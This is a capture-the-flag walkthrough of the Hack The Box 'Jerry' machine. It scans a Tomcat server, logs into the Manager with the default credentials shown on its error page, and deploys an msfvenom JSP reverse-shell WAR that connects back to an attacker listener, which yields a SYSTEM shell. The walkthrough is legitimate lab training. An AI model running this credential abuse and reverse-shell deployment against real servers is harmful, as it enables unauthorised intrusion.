# Jerry [HTB](https://app.hackthebox.com/machines/144)
![jerry-01]()


## Recon 

After adding the target to my `/etc/hosts` file, I scan for open ports with:

```bash
nmap -p- --min-rate 10000 jerry.htb
```

![ports-02]()

Let's run a software and version detection scan againts this port:

```bash
nmap -p 8080 -sCV jerry.htb -oN nmap.result
```

![nmap-res-03]()

We can see that an Apache Tomcat/Coyote server is running on port 8080. Based on the site's title we can guess that the server is at a fresh install state. 


### Apache-Coyote Port 8080

Before we begin let's answer the following question: 

+ What is Coyote?

From the description of Coyote on the [Tomcat page](https://tomcat.apache.org/tomcat-4.1-doc/config/coyote.html) Coyote is a stand-alone web server that provides servlets to Tomcat applets. That is, it functions like the Apache web server, but for JavaServer Pages (JSP).

It comes with a web interface called the `Manager` which makes it easy to administer and control web applications running in Tomcat using a web browser. Using the Manager, you can deploy a new WAR application and control existing ones without having to restart Tomcat. This should be our exploitation strategy. 

Let's have a look at this server by opening our browser at `http://jerry.htb:8080` :

![site-04]()

As you can see, we have three main feature on this page: `Server Status`, `Manager App`, and `host Manager`, the `Manager App` is what we want access to. Each one of these feature controls different aspects of the Coyote server, and to access each feature we need valid credentials. 

For example, clicking on the `Server Status` button brings the following window:

![login-05]()

After a few failed login attempts the server will lock you out for several minutes and disaply this error page:

![err-page-06]()

As you can see, this page gives a description on how to add users and roles to adminster the server. And in this page we can see suggested credentilas of `tomcat:s3cret` which I highlighted in red. So I decided to try them out, and they worked!

![logged-07]()

As you can see, the server redirected me to `manager/status`, where we can view different statics and info about the server. But what we really want is to access the server Manager app. 


So I decided to click on the `List Application` button on the left side of the page, and the Manager loads:

![manager-08]()

Meaning, the `Server-Status` feature, and the `Manager App` feature of the Tomcat server reused the same credentials. So we have access to the manager, let's try to upload a WAR payload!

If we scroll down a bit we can see the WAR deployment section:

![deploy-09]()

This is where we will upload our WAR payload. And as you can see, the server asks for a WAR file to deploy, which we need to create. We can do this with `msfvenom` as such:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.37 LPORT=9001 -f war > runme.war
```

![msfvenom-10]()

Now we can click on the `Choose File` button and select the war payload we created:


![choose-11]()

And then select `Deploy`. After that, you should see a new application in the applications list called `runme`:

![new-app-12]()

The tomcat server created a dedicated directory for the uploaded war application. Once we visit this directory, our WAR payload will execute and we should get a connection back to us.

So before we visit the page we need to start a local listener to catch the connection:

```bash
rlwrap nc -lnvp 9001
```

Now we can visit our malicious war application at `http://jerry.htb:8080/runme/` :

![visit-13]()

As you can see this returns an empty page, but on my netcat listener I get a connection:

![root-14]()

Apperantly, the Tomcat server was running under `NT Authority` on the target. So when the reverse shell triggered, we got a shell as the system.

If you are after the CTF flags, there is no low level user on this system, only the Administartor user is present. Inside the admin's Desktop page you will find the following directory:

![flags-15]()

There you will find a file that contains both flags. 
